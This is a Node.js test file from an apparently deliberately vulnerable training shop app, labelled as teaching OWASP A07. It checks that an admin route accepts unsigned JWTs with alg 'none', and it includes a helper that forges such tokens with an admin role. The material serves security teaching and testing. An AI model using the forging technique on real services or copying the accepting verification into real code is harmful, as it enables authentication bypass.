'use strict';

/**
 * @intentional-vulnerability auth-bypass-jwt-none
 * @teaches OWASP-Web:A07
 * @location server/routes/secureshop/admin.js
 *
 * This controlled HTTP contract mounts the actual PostgreSQL admin router but
 * replaces its eager repository dependency. /admin/whoami does not read SQL;
 * the test proves only its intentional JWT decoding behavior.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const express = require('express');
const http = require('node:http');
const jwt = require('jsonwebtoken');
const Module = require('node:module');

const REPO = path.resolve(__dirname, '../../../..');
const JWT_SECRET = 'controlled-auth-bypass-none-secret';
const previousJwtSecret = process.env.JWT_SECRET;
const previousAdminSecret = process.env.SS_ADMIN_JWT_SECRET;
process.env.JWT_SECRET = JWT_SECRET;
delete process.env.SS_ADMIN_JWT_SECRET;

let repositoryAccesses = 0;
const controlledRepository = new Proxy({}, {
  get() {
    repositoryAccesses += 1;
    throw new Error('whoami must not access the controlled repository');
  },
});
const adminWrapperPath = require.resolve(path.join(REPO, 'server/routes/secureshop/admin.js'));
const adminPostgresPath = require.resolve(path.join(REPO, 'server/routes/secureshop/postgres/admin.js'));
delete require.cache[adminWrapperPath];
delete require.cache[adminPostgresPath];
const originalLoad = Module._load;
let buildAdminRouter;
try {
  Module._load = function controlledLoad(request, parent, isMain) {
    if (request.endsWith('/database/postgres/secureshopAdminRepository')) {
      return { getSecureShopAdminRepository: () => controlledRepository };
    }
    return originalLoad.call(this, request, parent, isMain);
  };
  buildAdminRouter = require(adminWrapperPath);
} finally {
  Module._load = originalLoad;
}

function forgeNoneToken(payload) {
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  return `${header}.${body}.`;
}

function request(port, token) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      method: 'GET', host: '127.0.0.1', port,
      path: '/api/secureshop/admin/whoami',
      headers: token ? { authorization: `Bearer ${token}` } : {},
    }, (response) => {
      let raw = '';
      response.setEncoding('utf8');
      response.on('data', (chunk) => { raw += chunk; });
      response.on('end', () => {
        let body;
        try { body = JSON.parse(raw); } catch { body = raw; }
        resolve({ status: response.statusCode, body });
      });
    });
    req.on('error', reject);
    req.end();
  });
}

test('auth-bypass-jwt-none: actual admin whoami route accepts alg=none without repository access', async () => {
  const app = express();
  app.use(express.json());
  app.use('/api/secureshop', buildAdminRouter({
    pool: { async callTool() { throw new Error('unexpected tool call'); }, clients: new Map() },
    manifest: { getForRole: () => [] },
    provider: null,
  }));
  const server = http.createServer(app);
  await new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', resolve);
  });
  try {
    assert.equal((await request(server.address().port)).status, 401);
    const forged = await request(server.address().port, forgeNoneToken({ username: 'student_a', role: 'admin' }));
    assert.equal(forged.status, 200);
    assert.equal(forged.body.ok, true);
    assert.equal(forged.body.alg_accepted, 'none');
    assert.equal(forged.body.decoded.username, 'student_a');
    assert.equal(forged.body.decoded.role, 'admin');

    const legitimate = await request(server.address().port,
      jwt.sign({ username: 'demo', role: 'customer' }, JWT_SECRET, { algorithm: 'HS256' }));
    assert.equal(legitimate.status, 200);
    assert.equal(legitimate.body.alg_accepted, 'HS256');
    assert.equal(legitimate.body.decoded.username, 'demo');
    assert.equal(repositoryAccesses, 0, 'whoami made no repository or SQL claim');
  } finally {
    await new Promise((resolve) => server.close(resolve));
    delete require.cache[adminWrapperPath];
    delete require.cache[adminPostgresPath];
    if (previousJwtSecret === undefined) delete process.env.JWT_SECRET;
    else process.env.JWT_SECRET = previousJwtSecret;
    if (previousAdminSecret === undefined) delete process.env.SS_ADMIN_JWT_SECRET;
    else process.env.SS_ADMIN_JWT_SECRET = previousAdminSecret;
  }
});
